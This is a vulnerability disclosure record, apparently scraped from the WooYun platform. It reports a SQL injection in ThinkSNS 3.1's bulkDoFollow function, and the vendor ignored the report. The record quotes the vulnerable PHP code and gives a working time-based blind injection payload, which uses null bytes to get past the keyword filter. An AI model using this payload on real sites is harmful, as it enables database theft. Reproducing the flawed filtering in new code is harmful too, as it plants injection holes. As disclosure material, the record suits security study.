{"id": 45066, "wybug_id": "wooyun-2015-095972", "wybug_title": "ThinkSNS 防御绕过思路(union select 真正的无限制sql注射)", "wybug_corp": "ThinkSNS", "wybug_author": "menmen519", "wybug_date": "2015-02-20 12:16", "wybug_open_date": "2015-04-02 10:23", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向公众公开  简要描述： ThinkSNS 防御绕过思路(union select 真正的无限制sql注射) 详细说明：  \npublic function bulkDoFollow() {        // 安全过滤    \t$res = $this->_follow_model->bulkDoFollow($this->mid, t($_POST['fids']));    \t$this->ajaxReturn($res, $this->_follow_model->getError(), false !== $res);    }\n跟进bulkDoFollow\npublic function bulkDoFollow($uid, $fids) {\t\t$follow_states = $this->getFollowStateByFids($uid, $fids);\n跟进：getFollowStateByFids\npublic function getFollowStateByFids($uid, $fids) {\t\t\t\tarray_map( 'intval' , $fids);\t\t\t\t$_fids = is_array($fids) ? implode(',', $fids) : $fids;\t\tif(empty($_fids)) {\t\t\treturn array();\t\t}\t\t\t\t$follow_data = $this->where(\" ( uid = '{$uid}' AND fid IN({$_fids}) ) OR ( uid IN({$_fids}) and fid = '{$uid}')\")->findAll();\t\t\t\t$follow_states = $this->_formatFollowState($uid, $fids, $follow_data);\n看着一段逻辑array_map( 'intval' , $fids); $_fids = is_array($fids) ? implode(',', $fids) : $fids;fids如果是一个字符串array_map( 'intval' , \"1,2,3\");   这个是会报警告的，但是程序还是会往下执行所以造成注入发送url:http://localhost/ThinkSNS_V3.1_20131108_28822/index.php?app=public&mod=Follow&act=bulkDoFollowpostdata:fids=1,2,if(ascii(substr((sele%00ct user() fr%00om ts_atme limit 0,1),slee%00p(3),1))=114,5,1)))#造成全站信息可以猜测   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-04-02 10:23 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-23 19:43 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  过年还在忙碌！！！师父新年好！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}